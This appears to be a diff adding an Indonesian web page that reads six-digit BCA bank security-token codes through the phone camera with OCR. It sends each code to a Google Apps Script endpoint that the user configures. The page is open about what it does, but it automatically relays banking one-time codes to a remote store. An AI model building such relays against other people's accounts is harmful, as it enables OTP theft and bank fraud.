@@ -1,0 +1,235 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Scan Token BCA</title>
+  <style>
+    * { box-sizing: border-box; }
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background: #0b0f14;
+      color: #fff;
+      text-align: center;
+    }
+    .wrap {
+      max-width: 720px;
+      margin: 0 auto;
+      padding: 16px;
+    }
+    h1 {
+      font-size: 24px;
+      margin: 10px 0 6px;
+    }
+    p {
+      margin: 0 0 12px;
+      color: #b9c2cf;
+    }
+    video {
+      width: 100%;
+      border-radius: 14px;
+      background: #111;
+      border: 1px solid #243041;
+    }
+    .panel {
+      margin-top: 14px;
+      padding: 14px;
+      border-radius: 14px;
+      background: #111826;
+      border: 1px solid #243041;
+    }
+    .token {
+      font-size: 34px;
+      font-weight: 700;
+      letter-spacing: 3px;
+      color: #53f3c3;
+      margin: 8px 0;
+    }
+    .status {
+      font-size: 14px;
+      color: #c5d0de;
+      min-height: 20px;
+    }
+    .btns {
+      display: flex;
+      gap: 10px;
+      justify-content: center;
+      flex-wrap: wrap;
+      margin-top: 12px;
+    }
+    button {
+      border: 0;
+      border-radius: 10px;
+      padding: 12px 18px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+    .primary { background: #53f3c3; color: #082019; font-weight: 700; }
+    .secondary { background: #263244; color: #fff; }
+    canvas { display: none; }
+    .hint {
+      margin-top: 10px;
+      font-size: 13px;
+      color: #8fa0b5;
+    }
+  </style>
+</head>
+<body>
+  <div class="wrap">
+    <h1>Scan Token BCA</h1>
+    <p>Arahkan kamera ke angka token. Tidak perlu foto.</p>
+
+    <video id="video" autoplay playsinline muted></video>
+    <canvas id="canvas"></canvas>
+
+    <div class="panel">
+      <div>Hasil token</div>
+      <div class="token" id="tokenText">------</div>
+      <div class="status" id="statusText">Belum aktif</div>
+
+      <div class="btns">
+        <button class="primary" id="startBtn">Aktifkan Kamera</button>
+        <button class="secondary" id="stopBtn">Stop</button>
+      </div>
+
+      <div class="hint">
+        Tips: dekatkan ke token, jangan goyang, fokuskan hanya area angka.
+      </div>
+    </div>
+  </div>
+
+  <script src="https://cdn.jsdelivr.net/npm/tesseract.js@5/dist/tesseract.min.js"></script>
+  <script>
+    // GANTI DENGAN URL WEB APP APPS SCRIPT KAMU
+    const GAS_URL = "https://script.google.com/macros/s/AKfycbXXXXXXXXXXXX/exec";
+
+    const video = document.getElementById("video");
+    const canvas = document.getElementById("canvas");
+    const tokenText = document.getElementById("tokenText");
+    const statusText = document.getElementById("statusText");
+    const startBtn = document.getElementById("startBtn");
+    const stopBtn = document.getElementById("stopBtn");
+
+    let streamRef = null;
+    let scanTimer = null;
+    let isBusy = false;
+    let lastToken = "";
+    let lastSentAt = 0;
+
+    async function startCamera() {
+      try {
+        statusText.textContent = "Meminta izin kamera...";
+
+        streamRef = await navigator.mediaDevices.getUserMedia({
+          video: {
+            facingMode: { ideal: "environment" },
+            width: { ideal: 1280 },
+            height: { ideal: 720 }
+          },
+          audio: false
+        });
+
+        video.srcObject = streamRef;
+        await video.play();
+
+        statusText.textContent = "Kamera aktif. Arahkan ke token.";
+        clearInterval(scanTimer);
+        scanTimer = setInterval(scanLoop, 1400);
+      } catch (err) {
+        statusText.textContent = "Gagal akses kamera: " + err.message;
+        console.error(err);
+      }
+    }
+
+    function stopCamera() {
+      clearInterval(scanTimer);
+      scanTimer = null;
+
+      if (streamRef) {
+        streamRef.getTracks().forEach(track => track.stop());
+        streamRef = null;
+      }
+
+      video.srcObject = null;
+      statusText.textContent = "Kamera dihentikan.";
+    }
+
+    async function scanLoop() {
+      if (isBusy) return;
+      if (!video.videoWidth || !video.videoHeight) return;
+
+      isBusy = true;
+
+      try {
+        const ctx = canvas.getContext("2d");
+
+        // Crop tengah layar agar OCR lebih fokus
+        const vw = video.videoWidth;
+        const vh = video.videoHeight;
+
+        const cropW = Math.floor(vw * 0.7);
+        const cropH = Math.floor(vh * 0.25);
+        const cropX = Math.floor((vw - cropW) / 2);
+        const cropY = Math.floor((vh - cropH) / 2);
+
+        canvas.width = cropW;
+        canvas.height = cropH;
+
+        ctx.drawImage(video, cropX, cropY, cropW, cropH, 0, 0, cropW, cropH);
+
+        const result = await Tesseract.recognize(canvas, "eng", {
+          logger: () => {}
+        });
+
+        const rawText = (result.data.text || "").trim();
+        const digits = rawText.replace(/\D/g, "");
+
+        if (digits.length >= 6) {
+          const token = digits.substring(0, 6);
+          tokenText.textContent = token;
+
+          const now = Date.now();
+          const isSameRecent = token === lastToken && (now - lastSentAt < 10000);
+
+          if (!isSameRecent) {
+            statusText.textContent = "Mengirim token " + token + "...";
+
+            const body = new URLSearchParams({ token }).toString();
+
+            const res = await fetch(GAS_URL, {
+              method: "POST",
+              headers: {
+                "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8"
+              },
+              body
+            });
+
+            const json = await res.json().catch(() => ({}));
+
+            if (json.ok) {
+              lastToken = token;
+              lastSentAt = now;
+              statusText.textContent = "Tersimpan: " + token;
+            } else {
+              statusText.textContent = "Gagal simpan: " + (json.message || "Unknown error");
+            }
+          } else {
+            statusText.textContent = "Token sama, diabaikan.";
+          }
+        } else {
+          statusText.textContent = "Mencari token...";
+        }
+      } catch (err) {
+        statusText.textContent = "Error scan: " + err.message;
+        console.error(err);
+      }
+
+      isBusy = false;
+    }
+
+    startBtn.addEventListener("click", startCamera);
+    stopBtn.addEventListener("click", stopCamera);
+  </script>
+</body>
+</html>
